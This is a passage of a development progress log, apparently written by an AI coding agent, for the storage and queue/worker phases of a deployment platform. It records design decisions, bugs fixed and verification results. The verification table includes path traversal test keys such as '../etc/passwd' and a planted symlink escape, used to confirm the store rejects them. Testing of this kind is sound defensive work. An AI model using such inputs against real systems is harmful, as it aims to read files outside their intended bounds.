  `uncompressedChecksum`.
- `artifactResultSchema` (`file`, `ratio`, `durationMs`, `threadId`), `storageUsageSchema`,
  `fileListQuerySchema`.

**`packages/config`**
- `GZIP_LEVEL` (1–9, default 6) and `COMPRESSION_THREADS` (1–16, default 2), documented in
  `.env.example`.

**`apps/api`**
- `lib/object-store.ts` — the single `LocalObjectStore` handle; the one place that injects
  `STORAGE_ROOT` and the pool size into the storage package.
- `lib/storage-path.ts` — **deleted**; its path-sandbox logic now lives in `@forge/storage`.
- `repositories/file-repository.ts` — the `files` queries moved out of `project-repository.ts`,
  plus `listProjectFileIndex()` (keys only, for reconciliation) and `deleteFileRow()`.
- `services/upload-service.ts` — rewritten onto `objectStore.put()`; the multipart truncation check
  now runs in `put`'s `beforeCommit` hook, i.e. while the bytes are still only in the temp file.
- `services/file-service.ts` — `getProjectFiles`, `requireProjectFile`, `openDownload`
  (streamed, optional gunzip, safe filename, size-drift detection), `deleteProjectFile`, and
  `getStorageUsage`, which walks the store and reconciles it against the DB index to surface
  **orphans** (bytes with no row) and **missing** objects (rows with no bytes).
- `services/artifact-service.ts` — `compressProjectFile`: gzip a stored object on a worker thread,
  verify the source's recorded checksum against the hash the worker computed while reading it
  (mismatch ⇒ artifact deleted + 500), then index the artifact with both sides' sizes and hashes.
- `routes/files.ts` — `GET …/files`, `GET …/storage`, `GET …/files/:fileId/download[?decompress=true]`,
  `POST …/files/:fileId/compress`, `DELETE …/files/:fileId`.
- `services/project-service.ts` — deleting a project now drops its whole subtree from the store
  (`deletePrefix`) after the row is gone.
- `app.ts` — registers `fileRoutes`, exposes `content-disposition`/`x-forge-sha256`/`etag` through
  CORS, API version `0.3.0`. `server.ts` — `closeCompressionPool()` in the shutdown sequence.

**`apps/dashboard`**
- `lib/api.ts` — extended `StoredFile`, new `ArtifactResult`/`StorageUsage`, plus `downloadUrl()`
  and a shared `formatBytes()`.
- `components/source-upload-panel.tsx` — per-object **Download / Compress / Delete**, a live storage
  summary in the panel header (object count, total bytes, `gzip pool 1/2 busy`, orphan/missing
  warnings), and a result banner reporting ratio, duration and **which worker thread** did the gzip.
- `components/artifacts-panel.tsx` — artifacts with their compression ratio, both checksums, and two
  download buttons: the raw `.gz` and **Unpacked** (server-side gunzip).

### Decisions & assumptions

- **`@forge/storage` never reads the environment.** `ARCHITECTURE §9` allows `storage → shared` only,
  so the root and pool size are constructor/`configure()` arguments injected by
  `apps/api/src/lib/object-store.ts`. Keeps the package testable with a temp dir and honest about the
  documented boundary.
- **Keys, not paths, are the public vocabulary.** Callers pass `<org>/<project>/sources/<uuid>.zip`;
  only the store turns that into a filesystem path. `files.storage_path` stores the key.
- **Writes commit by `rename()`.** Chosen over "write in place then clean up on failure" (Phase 2's
  approach) because a partial object is never *visible* at all, not even briefly — which matters once
  a worker may read a source while an upload is running.
- **Dot-prefixed key segments are rejected** so staged temp files (`.<uuid>.part`) can never collide
  with a real key and `list()` can skip them with one rule.
- **`put()` takes a `beforeCommit` hook** rather than the API deleting a bad object afterwards. That's
  what lets the multipart truncation check happen pre-commit.
- **Whole-object gzip goes to a worker thread; streaming gunzip on download does not.** zlib's
  *stream* API already runs on the libuv threadpool, so inflating during a download doesn't block the
  loop. The worker thread earns its place for the full pipeline, where the sha256 passes around the
  gzip are synchronous main-thread work and a 40 MiB archive is ~1 s of CPU. Measured below.
- **Pool size defaults to 2, not `cpus-1`.** The point of the thread is that the API stays responsive;
  saturating every core with gzip would defeat it. Configurable via `COMPRESSION_THREADS`.
- **Compression metadata on `files`, not a separate `artifacts` table.** An artifact *is* a stored
  object; four nullable columns beat a second table plus a join. `checksum`/`size_bytes` **always**
  describe the bytes as stored, and `uncompressed_*` the original — so a decompressed download can be
  verified without gunzipping anything first.
- **`parent_file_id` is `ON DELETE SET NULL`.** Deleting a source shouldn't silently delete an
  artifact built from it.
- **The download route deliberately has no `200` response schema.** With `fastify-type-provider-zod`,
  declaring one makes the serializer try to JSON-encode the `Readable`; error shapes come from the
  error-handler plugin anyway.
- **`?decompress=true` exists as the round-trip proof** (and as the thing Phase 6 will use to read a
  gzipped log back). Content-length is served from `uncompressed_bytes` when known.
- **`x-forge-sha256` + `etag`** are set to the hash of *exactly* the bytes that response sends, so a
  client can verify without a second request. `cache-control: private, no-store` because objects are
  per-org and behind auth.
- **`GET …/storage` walks the disk instead of summing the DB.** Drift is the interesting signal; a sum
  of `files.size_bytes` could never show an orphan. It also reports live pool stats, which is what the
  dashboard header renders.
- **`deletePrefix` was added beyond the roadmap's `put/get/list/delete`** because project deletion
  needed it; it refuses an empty prefix so it can't nuke the whole store.
- **Deleting an object removes the bytes first, then the row** — a failure between the two shows up as
  `missingCount`, which is visible, rather than a row pointing at bytes that are gone.
- **Compressing is `member`+ and rate-limited to 20/min** (each call pins a thread); listing and
  downloading are any-member; deleting is `member`+.
- **Compression is only offered from `source`/`log` objects**, and re-compressing an artifact is a
  `409`. Compressing the same source twice is allowed and produces two artifacts — dedup isn't worth
  the complexity before real builds exist.
- `checksumObject()` is exported and unit-verified but not wired to a route; the artifact path already
  gets the same verification for free.

### Verification (all run on 2026-09-06)

| Check | Result |
|---|---|
| `pnpm install` → `pnpm build` | ✅ 5 packages + api (tsc) + dashboard (`next build`, 8 routes) |
| `pnpm typecheck` | ✅ clean across all 6 workspaces |
| `pnpm lint` | ✅ clean |
| `migrate up` | ✅ 4 columns + 2 check constraints + index |
| `migrate down` then `up` | ✅ rolls back and re-applies cleanly |
| **Package smoke test** (temp root, no API) | ✅ see rows below |
| `put` 4.14 MB stream | ✅ sha256 matches an independent `hashlib` digest of the same bytes |
| `get` → collected chunks | ✅ byte-identical to the input |
| `head` present / absent | ✅ key+size / `null` |
| `gzipObject` 4 139 946 B → 21 652 B | ✅ ratio 0.0052, 21 ms, **`threadId: 1`** |
| `gunzipObject` round trip | ✅ output checksum == original upload checksum |
| `checksumObject` re-read | ✅ matches |
| `put` with `limitBytes: 1024` | ✅ `OBJECT_TOO_LARGE`; `head` afterwards → `null` (**no partial object**) |
| `put` of 0 bytes | ✅ `EMPTY_OBJECT` |
| Key rejection: `../etc/passwd`, `<uuid>/../../escape`, `/abs/path`, `a//b`, `a/./b`, `trailing/`, `""` | ✅ all 7 → `INVALID_STORAGE_KEY` |
| **Symlink planted inside the root** pointing at `/tmp/forge-outside-secret.txt` | ✅ `get` → `INVALID_STORAGE_KEY` (400); `list()` does not report it |
| `delete` twice | ✅ `true` then `false` (idempotent) |
| `deletePrefix('<org>/<proj>')` / `deletePrefix('')` | ✅ 2 objects removed / refused with `INVALID_STORAGE_KEY` |
| **API upload** of a 1 110 361 B zip | ✅ `201`; `checksum` == `sha256sum` of the local file (`9bb2703e…`) |
| **API download** of the same object | ✅ `200`, `cmp` reports **identical bytes**; `content-length: 1110361`, `x-forge-sha256` + `etag` == the checksum, `content-disposition: attachment; filename="sample-app.zip"`, `cache-control: private, no-store` |
| **Compress** that source | ✅ `201`, 1 110 361 → 3 040 B, ratio 0.0027, 9 ms, **thread 3**; `uncompressedChecksum` == the source checksum |
| Raw `.gz` download → `sha256sum` | ✅ matches the artifact's recorded checksum; local `gunzip -c \| sha256sum` == the original |
| **`?decompress=true` download** | ✅ `200`, 1 110 361 bytes, `cmp` vs the original zip → **identical**; `x-forge-sha256` == original hash |
| Compress an artifact | ✅ `409 ALREADY_COMPRESSED` |
| `?decompress=true` on a plain source | ✅ `400 NOT_COMPRESSED` |
| Unknown / non-uuid file id | ✅ `404 FILE_NOT_FOUND` / `400 VALIDATION_ERROR` |
| `GET …/files` and `?kind=artifact` | ✅ both kinds listed; filter returns only the artifact |
| `GET …/storage` | ✅ `objectCount: 2`, per-kind split, live pool stats |
| **60 MiB upload vs the 50 MiB cap** | ✅ `400 OBJECT_TOO_LARGE`; **0 `.part` files** anywhere under the root (`find -name '.*'` → 0), still 1 object in `sources/` |
| Empty upload / `.exe` upload | ✅ `400 EMPTY_OBJECT` / `400 UNSUPPORTED_FILE_TYPE` |
| Object modes on disk | ✅ `-rw-r-----` (0640) for both source and artifact |
| **Orphan** (4 KiB planted directly on disk) | ✅ `orphanCount: 1`, `orphanBytes: 4096` |
| **Object removed underneath the index** | ✅ download → `404 OBJECT_MISSING`, `missingCount: 1`; after restoring the file → `200` |
| Delete an object, then again | ✅ `204` then `404` |
| **Delete a project** with 1 source + 1 artifact | ✅ `204`, `files` rows 0, and the project's subtree is **gone from the store** |
| RBAC: `viewer` API key — list / download | ✅ `200` / `200` |
| RBAC: `viewer` API key — compress / delete | ✅ `403` both, "requires the \"member\" role" |
| No credential | ✅ `401 UNAUTHORIZED` |
| Another org's member on the same project | ✅ `404 ORG_NOT_FOUND` for both download and `/storage` |
| **Event loop under load**: 4 concurrent gzips of a 40 MiB *incompressible* archive | ✅ each 964–1 056 ms on threads 3 and 4 (ratio 1.0003 — gzip grows random data, as expected); pool sampled at **2 busy / 2 queued**; 200 `/health` probes during it: **p50 1.8 ms, max 23 ms** |
| **Graceful shutdown mid-gzip** (SIGTERM 300 ms into a 30 MiB compression) | ✅ listener closed immediately (a fresh `/health` was refused), the in-flight request still returned `201` with the artifact committed, then `shutdown complete` and a clean exit |
| **Browser E2E (headless Chrome via CDP)**: register → create project → upload → compress → download → unpacked download → delete | ✅ **13/13** checks, incl. `content-disposition` = attachment, the response bytes hashing (SubtleCrypto) to `x-forge-sha256`, the unpacked artifact hashing to the *original* source hash, the ratio/duration/thread banner, and **0 console errors** |

### Not done / deferred on purpose

- **Still no Vitest suites.** Verification is a scratchpad smoke script + curl + a CDP browser script.
  This is now three phases of accumulated test debt and the biggest gap in the project.
- **No `kind='log'` objects yet.** The download route is kind-agnostic and `logKey()` exists, but
  nothing writes log objects until Phase 6.
- **No `Range` header support** — downloads are all-or-nothing, no resume.
- **No storage garbage collection.** Orphans and missing objects are *reported* by `GET …/storage`
  but nothing sweeps them; superseded source uploads are still never pruned.
- **No per-org quota or `usage` metering** (`bytes_stored` is in `DATA_MODEL.md`, unused).
- **No artifact dedup or retention policy** — compressing the same source twice yields two artifacts.
- **Artifacts are gzip of a single object**, not a tar of a build directory. Packaging a real build
  tree is Phase 6/7, where `gzipObject` gets reused.
- **The store is still local-filesystem only.** The interface is S3-shaped but there is no second
  implementation, so "swappable" is a claim, not a tested fact.
- **`compressionPoolStats()` is not on `/metrics`** — that's Phase 9; today it surfaces only through
  `GET …/storage` and the dashboard header.
- Archives are still never unpacked or validated as archives (zip-slip/zip-bomb remain Phase 6).

### Next up — Phase 4 (Queue & worker skeleton)

`packages/queue` with the BullMQ `deployments` queue and a Zod-typed job payload in `@forge/shared`;
`POST /deployments` inserting a `queued` deployment, enqueuing, returning `202` and honouring the
idempotency key; and `apps/worker` as a BullMQ processor that claims a job and walks the fake stages
to `live`, persisting every transition to `deployments` + `deployment_events` with a worker registry
and heartbeat. That needs the migration Phase 2 and 3 both deferred: the `deployments` table, plus the
two forward-reference FKs (`projects.active_deployment_id`, `files.deployment_id`). Storage is ready
for it — `logKey()` and `artifactKey()` already carry a deployment id, and the worker will construct
its own `LocalObjectStore` the same way the API does.

---

## Phase 4 — Queue & worker skeleton ✅

**Goal:** clicking Deploy creates a job that a worker picks up (no real build yet).
**Completed:** 2026-09-06.

### What shipped

**`packages/shared`** (`src/deployments.ts`)
- **`DEPLOYMENT_TRANSITIONS` + `canTransition()`** — `ARCHITECTURE §4`'s state machine as executable
  code, shared by the API and the worker. An illegal transition throws rather than writing an
  impossible row.
- `DEPLOYMENT_PIPELINE_STAGES` (the nine happy-path statuses, in order),
  `DEPLOYMENT_STATUS_LABELS`, `pipelineStageIndex()` — one definition of "how far along is this",
  used by both the worker's stage list and the dashboard's progress bar.
- Zod schemas + types: `deploymentSchema`, `createDeploymentSchema`, `deploymentListQuerySchema`,
  `deploymentEventSchema`, `deploymentEventsQuerySchema`, `workerSchema`, `workerHeartbeatSchema`,
  `queueStatsSchema`, `fleetSchema`, **`deploymentJobSchema`** (the queue payload) and
  `deploymentStatusMessageSchema` (the Pub/Sub frame Phase 5 will forward to sockets).
- `REDIS_KEYS.workersOnline`, `DEPLOYMENT_JOB_NAME`, `WORKER_HEARTBEAT_TTL_FACTOR`.

**`packages/queue`** (new, `@forge/queue` — depends on `@forge/shared` only)
- `src/connection.ts` — **the one Redis connection factory in the repo**, with three roles:
  `command` (fails a request in seconds when Redis is down), `bullmq` (`maxRetriesPerRequest: null`,
  `enableReadyCheck: false`, as BullMQ requires for blocking commands) and `subscriber` (Phase 5).
  The URL is a parameter, not an env read — `ARCHITECTURE §9` allows `queue → shared` only.
- `src/deployments-queue.ts` — `configureQueue()`, `getDeploymentsQueue()`, `enqueueDeployment()`
  (payload validated at the producer; **BullMQ job id = deployment id**), `forgetDeploymentJob()`,
  `getQueueStats()`, `createDeploymentWorker()` (`autorun: false`), `createDeploymentQueueEvents()`
  and `closeQueue()`. Every producer-side command is wrapped in `withDeadline()` — see the bugs
  section below.

**`packages/db`**
- Migration `1757400000000_deployments-workers.ts` — `deployment_status` / `worker_status` /
  `log_stream` enums, and the `workers`, `deployments`, `deployment_events` tables. The three tables
  reference each other in a cycle, so columns are created bare and the FKs added afterwards. It also
  lands **the two forward references Phases 2 and 3 deferred**: `projects.active_deployment_id` and
  `files.deployment_id`. Reversible, round-trip tested.
- `src/repositories/deployments.ts` and `src/repositories/workers.ts` — **shared repositories** (both
  the API and the worker need them; `ARCHITECTURE §2.4` puts shared repository helpers in `db`).
  Includes `claimDeployment()` (a *conditional* update, so two workers racing on a re-delivered job
  can't both claim it), `updateDeployment()`, `setActiveDeployment()`, `insertDeploymentEvent()`,
  `listDeploymentEvents()` (with an `afterId` cursor), `registerWorker()`, `heartbeatWorker()` and
  `pruneStaleWorkers()`.
- Kysely types for all three tables; `Database` extended.

**`packages/config`**
- `WORKER_NAME`, `WORKER_CONCURRENCY` (2), `WORKER_HEARTBEAT_MS` (5 000), `DEPLOY_JOB_ATTEMPTS` (1),
  `DEPLOY_JOB_BACKOFF_MS` (5 000), `DEPLOY_JOB_LOCK_MS` (60 000), `QUEUE_OPERATION_TIMEOUT_MS`
  (5 000), `DEPLOY_STAGE_DELAY_MS` (700). All documented in `.env.example`.

**`apps/api`** (version `0.4.0`)
- `lib/redis.ts` — rewritten onto `@forge/queue`'s factory (the move Phase 0 said would happen here)
  and split into **three connections**: the shared command connection, a **rate-limiter** connection
  and a **publisher** connection, the last two with ioredis's offline queue disabled. See bugs below.
- `lib/queue.ts` — the single injection point for `REDIS_URL` and the job options into `@forge/queue`,
  called from `buildApp()` before any route can enqueue.
- `services/deployment-service.ts` — `createDeployment()` resolves the source (newest uploaded
  archive unless a `sourceFileId` is given; `409 NO_SOURCE` if the project has none), honours the
  idempotency key on both the **fast path** (pre-insert lookup) and the **race path** (`23505` →
  read back the winner's row), writes the initial `queued` event, publishes it, then enqueues.
  If the enqueue fails the row is marked `failed`/`ENQUEUE_FAILED` and the caller gets a `503` —
  a `queued` row nobody will ever pick up is worse than an error.
- `services/fleet-service.ts` — queue counts from BullMQ + the `workers` registry, with **liveness
  read from Redis** (`EXISTS worker:<id>:heartbeat`) rather than the row.
- `routes/deployments.ts` — `POST` (202 new / **200 idempotency replay**), list, get, `…/events`
  (with the `afterId` replay cursor), plus org-level `GET /orgs/:orgId/deployments` and
  `GET /orgs/:orgId/fleet`.
- `services/serializers.ts` — `toDeployment`, `toDeploymentEvent`, `toWorkerView`.
- `server.ts` — `closeQueue()` added to the shutdown sequence.

**`apps/worker`** (new app, `@forge/worker`)
- `src/main.ts` — boot (ping Postgres, open Redis, prune long-dead worker rows, register, then
  `worker.run()`), BullMQ event logging (`failed` / `completed` / **`stalled`**), and graceful
  shutdown: `drain()` → `queueWorker.close()` (finishes in-flight deployments) → `unregister()` →
  close every handle, behind a `SHUTDOWN_TIMEOUT_MS` force timer.
- `src/services/worker-registry.ts` — dual registration: a durable row in `workers` and a Redis key
  with a TTL of 3 heartbeat intervals, plus the `workers:online` set. Tracks active jobs so the
  fleet view shows what is running where.
- `src/services/deployment-state.ts` — **the only place a deployment's status changes.** Postgres
  first (`deployments.status` + append `deployment_events`), then publish to `deployment:<id>` and
  `project:<id>`. Publishing is best-effort and deliberately swallowed; the durable record already
  exists and Phase 5's replay reads it back. Also `logLine()` and `failDeployment()`.
- `src/pipeline/simulated-pipeline.ts` — the real stage list, transitions and events with the work
  stubbed out: `cloning → installing → building → creating_container → starting → health_check →
  live`, each emitting a status transition (label) plus a `system` log line (the command or action
  that Phase 6/7 will actually run). Honours `fail_at`.
- `src/processor.ts` — re-reads the row (the job payload is only a pointer), skips canceled/stopped
  and already-finished deployments, re-queues a `failed` row on a retry (`failed → queued` is a legal
  transition), claims conditionally, runs the pipeline, sets `projects.active_deployment_id` on
  success, and on failure records the reason **from wherever the pipeline actually stopped** before
  rethrowing so BullMQ marks the job failed.

**`apps/dashboard`**
- `components/deployment-pipeline.tsx` — the nine-stage progress strip (done / active+pulse /
  failed-here / pending) and a `StatusBadge`. Position is derived from the server's status; the UI
  never advances a stage on its own.
- `components/deployments-panel.tsx` — Deploy button, a **simulated-failure selector**, a
  **“Double-click test”** that fires the same request twice to demonstrate idempotency, the selected
  deployment's pipeline + error box + **event timeline** (read with the `afterId` cursor and
  accumulated across polls), and the build history list.
- `app/orgs/[orgSlug]/fleet/page.tsx` + a **Fleet** nav item — queue counters, the worker table
  (status dot, host/pid, concurrency, what it's running, heartbeat age) and org-wide recent
  deployments. Polls every 2s.
- `lib/api.ts` — deployment/worker/queue types, `PIPELINE_STAGES`, `STATUS_LABELS`,
  `isSettled()`, `formatDuration()`, `formatAgo()`.

**Root** — `pnpm dev` now runs packages + api + **worker** + dashboard.

### Decisions & assumptions

- **Idempotency is a partial unique index, not the plain `UNIQUE` in `DATA_MODEL.md`.**
  `UNIQUE (project_id, source_ref, idempotency_key)` can never fire in Postgres when any column is
  NULL — which is the common case. The index is
  `(project_id, coalesce(source_ref,''), idempotency_key) WHERE idempotency_key IS NOT NULL`: it
  enforces the documented rule exactly when a key was supplied and leaves keyless deploys free to
  repeat. `DATA_MODEL.md` was updated to match.
- **`source_ref` for an upload project is the source `files.id`.** That makes the idempotency tuple
  mean something concrete: "the same source, with the same key, is the same deployment".
- **Deploying requires a stored source** (`409 NO_SOURCE`). The pipeline is simulated, but a
  deployment that isn't *of* anything would make the source/idempotency story fiction.
- **Routes are nested under the project** (`POST /orgs/:orgId/projects/:projectId/deployments`), not
  the roadmap's bare `POST /deployments`, so RBAC stays the same one-line `requireRole` check as
  everywhere else. Deploying is `member`+; reading is any member.
- **`fail_at` is a real column, not a query flag.** The demo needs a deterministic failure, the
  worker must read it from the row (the job is only a pointer), and Phase 8's failure/retry demos
  need the same hook. It becomes a no-op when Phase 6 brings real builds.
- **`DEPLOY_JOB_ATTEMPTS` defaults to 1.** Retries, `attempt` history and the dead-letter queue are
  Phase 8; the wiring (`attempt` tracked on the row, `failed → queued` re-queue, backoff config) is
  in place and was verified at `ATTEMPTS=2`, but the default keeps Phase 4's demo unambiguous.
- **Shared repositories live in `@forge/db`**, unlike the app-specific ones in `apps/api/repositories`.
  The API and the worker both drive deployments, and an app may not import another app.
- **The BullMQ job id is the deployment id.** A duplicate enqueue of the same deployment is a no-op at
  the queue level as well as in the database. The flip side: re-enqueuing an *existing* deployment
  (Phase 8's retry/rollback) must call `forgetDeploymentJob()` first or BullMQ silently ignores the
  add — noted in the code.
- **`claimDeployment` is a conditional UPDATE** (`WHERE status IN ('queued','assigned')`) rather than
  a transaction + lock: the database arbitrates, and the losing worker simply skips the job.
- **A `live` deployment gets no `url`, `container_id` or `host_port`.** Nothing is actually serving;
  writing a plausible URL would be a lie. Phase 7 fills them in. `projects.active_deployment_id`
  *is* set, since the pipeline genuinely reached `live`.
- **Status events carry the stage label, log events carry the detail.** The first draft wrote the
  same string to both, which made the timeline read as duplicates.
- **Worker liveness is Redis, not the `workers.status` column.** A SIGKILLed worker never writes
  `offline`; `toWorkerView` therefore reports `offline` for any worker whose heartbeat key has
  expired, regardless of the row.
- **`pruneStaleWorkers` only deletes rows no deployment references**, so "which worker ran this
  build" survives even when the registry is tidied.
- The dashboard **polls** (1s while a deployment moves, 2s for the fleet). Phase 5 replaces the
  polling with the WebSocket topic; the payload shapes rendered today are already the ones the
  socket will push.

### Bugs found and fixed during verification

1. **A dead Redis hung the deploy request instead of failing it.** BullMQ connections must use
   `maxRetriesPerRequest: null`, so a producer command issued while Redis is down waits *forever* —
   `POST /deployments` never returned. Fixed by wrapping every producer-side queue command in
   `withDeadline()` (`QUEUE_OPERATION_TIMEOUT_MS`, default 5s), which turns the outage into a clean
   `503 QUEUE_UNAVAILABLE` plus a `failed`/`ENQUEUE_FAILED` row.
2. **`lazyConnect` made connections unrecoverable.** With ioredis's `lazyConnect`, a *first*
   connection attempt that fails leaves the client in `end` and it never retries — so an API process
   started while Redis was down stayed permanently broken (`Connection is closed.`) even after Redis
   came back. Connections are now eager, so every failure goes through `retryStrategy`. Verified by
   booting the API during an outage and watching the same process recover.
3. **A dead Redis added 4–9 s to *every* request.** The rate limiter runs on every request and fails
   open, but its INCR sat in ioredis's offline queue waiting for the retry cap. It now has its own
   connection with `enableOfflineQueue: false`, so it fails instantly and `skipOnError` serves the
   request. `/health/live` went from 4–9 s to ~0 ms with Redis down. Pipeline-event publishing got the
   same treatment (best-effort work must never add latency).
4. **The dashboard could miss a deployment's final events.** Event polling was switched off as soon
   as the deployment row read `live`, which happens a beat before the last events are fetched — so
   "Deployment is live" sometimes never appeared. Polling now stops only once the *timeline* contains
   a terminal status **and** the last poll came back empty. Caught by the browser suite (14/15 → 15/15).

Also removed: a `useFailurePoint` hook that fetched the event list a second time to find where a
failure stopped — it is derived from the timeline that is already loaded.

A second review pass over the new code found five more, all fixed:

5. **Log lines were published as `status` frames.** `logLine()` emitted a
   `deploymentStatusMessageSchema` payload with `type: 'status'`, so a subscriber could not tell a
   build log line from a state transition without re-reading Postgres — and Phase 5's gateway is
   built directly on this contract. `@forge/shared` now defines `deploymentLogMessageSchema` and a
   `deploymentMessageSchema` discriminated union; log frames carry `type: 'log'` and their `stream`.
6. **`GET …/fleet` returned 500 when Redis was down**, despite the code's own comment promising it
   would still render the worker list from Postgres: `safeQueueStats()` was guarded but the heartbeat
   read was not. `readOnline()` now returns an empty set on failure, so every worker is reported
   `offline` — the honest answer — and the page still renders.
7. **A dead Redis was indistinguishable from a paused queue.** The fallback stats returned
   `paused: true`, which the dashboard rendered as an outage banner and which would misreport a
   genuinely paused queue. `queueStatsSchema` gained an explicit `available` flag; `paused` now means
   only what it says.
8. **A dead BullMQ consumer loop went unnoticed.** `void queueWorker.run()` discarded the promise, so
   a failure of the consumer loop surfaced only as a generic unhandled rejection while the process
   kept running, registered and heartbeating, consuming nothing. It now logs fatally and shuts down.
9. **The worker leaked its BullMQ connection on shutdown.** BullMQ does not close a connection it did
   not create, and `closeQueue()` only closed the producer's. Connections handed to Workers/QueueEvents
   are tracked in `@forge/queue` and closed with the rest — the process exited anyway, but "close every
   handle, then exit" is the point of `CLAUDE.md §4`.

Hardening in the same pass: `MAX_LOG_LINE_LENGTH` (4 KiB) + `clampLogLine()` in `@forge/shared`, applied
in `logLine()`. Build output is untrusted and `CLAUDE.md §8` requires log size to be bounded; Phase 6
streams real stdout/stderr through the same function.

### Verification (all run on 2026-09-06)

| Check | Result |
|---|---|
| `pnpm install` | ✅ 9 workspace projects (`@forge/queue`, `@forge/worker` added) |
| `pnpm typecheck` | ✅ clean across all 8 workspaces |
| `pnpm lint` | ✅ clean |
| `pnpm build` | ✅ 6 packages + api + worker (tsc) + dashboard (`next build`, 9 routes) |
| `migrate up` | ✅ 3 enums + `workers`/`deployments`/`deployment_events`, the idempotency index, and the 3 deferred FKs (`projects.active_deployment_id`, `files.deployment_id`, `workers.current_deployment_id`) |
| `migrate down` then `up` | ✅ round-trips cleanly |
| `pnpm dev` | ✅ packages + api (:4000) + **worker** + dashboard (:3000) all up; a deploy run under it reached `live` in 4 280 ms |
| Deploy with no source uploaded | ✅ `409 NO_SOURCE` |
| **Deploy** (`POST …/deployments`) | ✅ `202`, status `queued`, job enqueued |
| Full pipeline | ✅ `queued → assigned → cloning → installing → building → creating_container → starting → health_check → live`, ~4.3 s, `workerId` set, `durationMs` recorded |
| `deployment_events` timeline | ✅ 16 rows: a `status` row per transition + a `system` `log` row per stage, ids monotonic |
| `projects.active_deployment_id` | ✅ points at the deployment that went live |
| **Idempotency — replay** (same key twice, sequential) | ✅ second call `200` with the **same id**; one row |
| **Idempotency — race** (two identical requests in parallel) | ✅ one deployment; the UI's "Double-click test" reports `Two identical requests → one deployment` |
| Keyless repeat deploy of the same source | ✅ `202`, a **new** deployment (correct: no key = no promise) |
| Simulated failure (`failAt: building`) | ✅ `failed`, `errorCode: BUILDING_FAILED`, timeline stops at `building`, `durationMs` recorded |
| **Retry** (`DEPLOY_JOB_ATTEMPTS=2`) | ✅ attempt 1 fails on worker-b → `Retrying (attempt 2)` → re-claimed by **worker-a** → fails again → terminal `failed`, `attempt=2` |
| **Two workers competing** | ✅ 6 concurrent deploys → queue showed `active: 4, waiting: 2` (2 workers × concurrency 2), final split **3 / 3** |
| Worker registry + heartbeat | ✅ row in `workers`, `worker:<id>:heartbeat` present with TTL, `workers:online` set populated |
| **Graceful shutdown mid-deployment** (SIGTERM 2 s into a 4.3 s pipeline) | ✅ logs `shutting down {activeJobs: 1}`, the in-flight deployment still reached `live` (4 277 ms), then `worker unregistered` → `shutdown complete`, clean exit — re-verified after the connection-ownership fix |
| **SIGKILL a worker** | ✅ Postgres row still reads `idle` (it never got to write `offline`); heartbeat key gone after ~15 s and the API reports `status: offline, online: false` |
| **Redis Pub/Sub fan-out** | ✅ `psubscribe 'deployment:*'` received all 16 frames for one deployment, in order |
| **Redis down → deploy** | ✅ `503 QUEUE_UNAVAILABLE` (bounded at ~5 s by the deadline, 64 ms when the socket is already closed), row left as `failed`/`ENQUEUE_FAILED` |
| **Redis down → `GET …/fleet`** | ✅ `200` (was `500`): `queue.available: false`, `paused: false`, all 9 registered workers still listed from Postgres and reported `offline` |
| **Redis Pub/Sub frame types** | ✅ one deployment → 7 `status` + 7 `log` frames; every log frame carries `type: "log"` and its `stream` |
| **Redis down → `/health`** | ✅ `503` in 1.9 s with `redis.error: "redis check timed out after 3000ms"`; `/health/live` `200` in ~0 ms |
| **Redis restored, same API process** | ✅ `/health` `200`, next deploy `202` in 26 ms — no restart needed |
| Deployment queued during the outage after Redis returned | ✅ picked up by the worker and reached `live` |
| RBAC: viewer deploys | ✅ `403` "requires the \"member\" role" |
| RBAC: viewer lists deployments / reads fleet | ✅ `200` / `200` |
| No credential | ✅ `401 UNAUTHORIZED` |
| Outsider reads another org's deployments | ✅ `404 ORG_NOT_FOUND` |
| Unknown deployment id / unknown `sourceFileId` | ✅ `404 DEPLOYMENT_NOT_FOUND` / `404 SOURCE_NOT_FOUND` |
| Invalid `failAt` | ✅ `400 VALIDATION_ERROR` with the allowed enum listed |
| **Browser E2E (headless Chrome via CDP)** — register → create project → upload → Deploy → watch the pipeline → double-click test → simulated failure → fleet page | ✅ **15/15**, incl. all 7 stages appearing in the DOM, `$ npm install` / `$ npm run build` in the timeline, `BUILDING_FAILED` surfaced, queue counters and the worker listed, and **0 console errors** |
| **Browser RBAC (viewer)** | ✅ **5/5** — panel visible, no Deploy button, "requires the 'member' role" shown, and a direct `fetch` from that session still `403` |
| Both browser suites re-run after the second fix pass | ✅ **15/15** and **5/5**, still 0 console errors |

### Not done / deferred on purpose

- **Still no Vitest suites.** Four phases of accumulated test debt; verification remains curl +
  scratchpad scripts + two CDP browser suites. This is the project's biggest gap.
- **No real work happens.** `cloning`/`installing`/`building` are `setTimeout`s — Phase 6 brings
  `child_process.spawn`, log streaming and sandboxing; Phase 7 brings `dockerode`, ports and health
  checks. The state machine, persistence, publishing and failure handling around them are real.
- **No WebSocket.** Every transition and log line is published to `deployment:<id>` and
  `project:<id>` already, as the `deploymentMessageSchema` union Phase 5's gateway will consume, but
  nothing subscribes; the dashboard polls. Phase 5.
- **No cancel, stop, retry-button or rollback endpoints.** `canceled`/`stopped`/`rolled_back` exist in
  the enum and the transition table but no route reaches them. Phases 7–8.
- **No dead-letter queue.** `QUEUE_NAMES.deploymentsDlq` is defined and unused; exhausted attempts
  currently just leave the deployment `failed`. Phase 8.
- **No Redis project lock** ("one live container per project") — nothing runs a container yet. Phase 7.
- **No log objects in storage.** `deployment_events` holds the timeline; the `kind='log'` file
  dual-write lands with real logs in Phase 6.
- **`deployment:<id>:logtail`** (the bounded Redis list) is defined in `REDIS_KEYS` and unused.
- **Stalled-job recovery is wired but not demonstrated.** The `stalled` handler logs it and
  `DEPLOY_JOB_LOCK_MS` is configurable; killing a worker mid-build and watching another finish the job
  is Phase 10's demo.
- **No queue metrics on `/metrics`** — `getQueueStats()` surfaces only through `GET …/fleet`. Phase 9.
- **`workers.concurrency`/`pid`/`host` are informational**; nothing schedules on them.
- The fleet route is nested under `/orgs/:orgId` for authorization convenience even though workers and
  the queue are global infrastructure — any member of any org sees the same fleet.

### Next up — Phase 5 (Realtime: WebSockets + Pub/Sub)

The publish side is already done: the worker writes every transition to Postgres and publishes a
`deploymentMessageSchema` frame (`status` or `log`) on `deployment:<id>` and `project:<id>`. Phase 5 adds the
consumer half — a `@fastify/websocket` gateway with a hand-rolled subscribe/unsubscribe registry per
socket, one Redis subscriber connection per API process fanning out to the local sockets (the
`subscriber` role already exists in `@forge/queue`'s factory), the shared WS event contract in
`@forge/shared` (`log | status | metric | error`), and reconnect replay using the `afterId` cursor
that `GET …/deployments/:id/events` already implements. On the dashboard it is a swap, not a rewrite:
